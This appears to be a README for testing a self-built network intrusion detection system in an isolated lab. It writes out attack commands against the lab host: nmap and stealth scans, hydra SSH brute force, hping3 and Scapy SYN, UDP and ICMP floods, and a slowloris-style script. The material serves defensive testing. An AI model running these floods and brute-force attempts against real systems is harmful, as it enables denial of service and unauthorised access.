# NIDPS Real-World Testing Guide

This guide will help you set up a private test network and perform comprehensive real-world testing of your NIDPS system.

## 🏗️ Network Setup

### Prerequisites
- **NIDPS Machine**: Your main PC running NIDPS
- **Attacker Machine**: Parrot OS VM or physical machine
- **Network**: Private network (192.168.100.0/24)

### Step 1: Configure NIDPS Machine

1. **Set up test network**:
   ```bash
   sudo chmod +x setup_test_network.sh
   sudo ./setup_test_network.sh
   ```

2. **Start NIDPS**:
   ```bash
   python run.py
   ```

3. **Start real-time monitor** (in another terminal):
   ```bash
   python real_time_monitor.py
   ```

### Step 2: Configure Attacker Machine (Parrot OS VM)

1. **Install dependencies**:
   ```bash
   sudo chmod +x setup_attacker_machine.sh
   sudo ./setup_attacker_machine.sh
   ```

2. **Configure network**:
   - IP: 192.168.100.20
   - Gateway: 192.168.100.10
   - Netmask: 255.255.255.0

3. **Test connectivity**:
   ```bash
   ping 192.168.100.10
   ```

## 🚀 Running Tests

### Basic Connectivity Test
```bash
# On attacker machine
ping 192.168.100.10
nmap -sn 192.168.100.10
```

### Comprehensive Attack Test
```bash
# On attacker machine
python3 attacker_test_suite.py
```

### Individual Attack Tests

#### 1. Port Scanning
```bash
# Basic scan
nmap 192.168.100.10

# Aggressive scan
nmap -A -T4 192.168.100.10

# Port range scan
nmap -p 1-1000 192.168.100.10
```

#### 2. SSH Brute Force
```bash
# Using hydra
hydra -L users.txt -P passwords.txt 192.168.100.10 ssh

# Using Python script
python3 -c "
import paramiko
ssh = paramiko.SSHClient()
ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
ssh.connect('192.168.100.10', username='admin', password='admin')
"
```

#### 3. SYN Flood Attack
```bash
# Using hping3
hping3 -S -p 80 --flood 192.168.100.10

# Using Python/Scapy
python3 -c "
from scapy.all import *
send(IP(dst='192.168.100.10')/TCP(dport=80, flags='S'), loop=1)
"
```

#### 4. UDP Flood Attack
```bash
# Using hping3
hping3 -2 -p 53 --flood 192.168.100.10

# Using Python/Scapy
python3 -c "
from scapy.all import *
send(IP(dst='192.168.100.10')/UDP(dport=53)/Raw(load='A'*100), loop=1)
"
```

#### 5. HTTP DoS Attack
```bash
# Using Python
python3 -c "
import requests
for i in range(100):
    requests.get('http://192.168.100.10:5000')
"
```

#### 6. ICMP Flood
```bash
# Using hping3
hping3 -1 --flood 192.168.100.10

# Using Python/Scapy
python3 -c "
from scapy.all import *
send(IP(dst='192.168.100.10')/ICMP(), loop=1)
"
```

## 📊 Monitoring and Analysis

### Real-Time Monitoring
The NIDPS real-time monitor shows:
- System resource usage (CPU, Memory, Disk)
- Network traffic statistics
- Engine status and performance
- Recent alerts and detections
- Performance indicators

### Web Interface Monitoring
Access the NIDPS web interface at `http://192.168.100.10:5000` to view:
- Live alerts and detections
- System resource monitoring
- Analytics and threat intelligence
- Configuration and rules management

### Log Analysis
Monitor logs in real-time:
```bash
# NIDPS logs
tail -f logs/nidps.log

# System logs
sudo tail -f /var/log/syslog | grep nidps
```

## 🔧 Advanced Testing Scenarios

### Scenario 1: Stealth Port Scan
```bash
# Slow scan to avoid detection
nmap -sS -T1 -p 1-65535 192.168.100.10
```

### Scenario 2: Service Enumeration
```bash
# Service version detection
nmap -sV -sC 192.168.100.10

# Script scan
nmap --script=vuln 192.168.100.10
```

### Scenario 3: DDoS Simulation
```bash
# Multiple attack vectors
hping3 -S -p 80 --flood 192.168.100.10 &
hping3 -2 -p 53 --flood 192.168.100.10 &
hping3 -1 --flood 192.168.100.10 &
```

### Scenario 4: Application Layer Attacks
```bash
# HTTP slowloris
python3 -c "
import socket
sockets = []
for i in range(100):
    s = socket.socket()
    s.connect(('192.168.100.10', 5000))
    s.send(b'GET / HTTP/1.1\r\n')
    sockets.append(s)
"
```

## 📈 Performance Testing

### Load Testing
```bash
# High-volume traffic
for i in {1..1000}; do
    curl -s http://192.168.100.10:5000 > /dev/null &
done
```

### Stress Testing
```bash
# Multiple attack types simultaneously
python3 attacker_test_suite.py &
nmap -A -T4 192.168.100.10 &
hping3 -S -p 80 --flood 192.168.100.10 &
```

## 🧹 Cleanup

### After Testing
```bash
# On NIDPS machine
sudo ./cleanup_test_network.sh

# On attacker machine
sudo systemctl restart networking
```

## 📋 Test Checklist

- [ ] Network connectivity established
- [ ] NIDPS engine running and monitoring
- [ ] Real-time monitor active
- [ ] Web interface accessible
- [ ] Basic port scan detected
- [ ] SSH brute force detected
- [ ] SYN flood detected
- [ ] UDP flood detected
- [ ] HTTP DoS detected
- [ ] ICMP flood detected
- [ ] Alerts generated in web interface
- [ ] Logs captured properly
- [ ] Performance monitoring working
- [ ] Auto-recovery functioning (if enabled)

## 🚨 Safety Notes

1. **Isolated Network**: Always use the isolated test network
2. **Legal Compliance**: Only test on your own systems
3. **Resource Monitoring**: Watch system resources during testing
4. **Backup**: Backup important data before testing
5. **Documentation**: Document all test results and findings

## 🔍 Troubleshooting

### Common Issues

1. **Network connectivity problems**:
   - Check IP configuration
   - Verify firewall settings
   - Test with ping

2. **NIDPS not detecting attacks**:
   - Check engine status
   - Verify rules configuration
   - Check log files

3. **Performance issues**:
   - Monitor system resources
   - Adjust sampling rates
   - Enable performance mode

4. **Web interface not accessible**:
   - Check if NIDPS is running
   - Verify port configuration
   - Check firewall rules

### Debug Commands
```bash
# Check NIDPS status
curl http://192.168.100.10:5000/api/engine_status

# Check system stats
curl http://192.168.100.10:5000/api/system_stats

# Check alerts
curl http://192.168.100.10:5000/api/alerts

# Monitor logs
tail -f logs/nidps.log
```

## 📞 Support

If you encounter issues:
1. Check the logs in `logs/nidps.log`
2. Verify network configuration
3. Test with basic connectivity first
4. Review the troubleshooting section above

Happy testing! 🚀 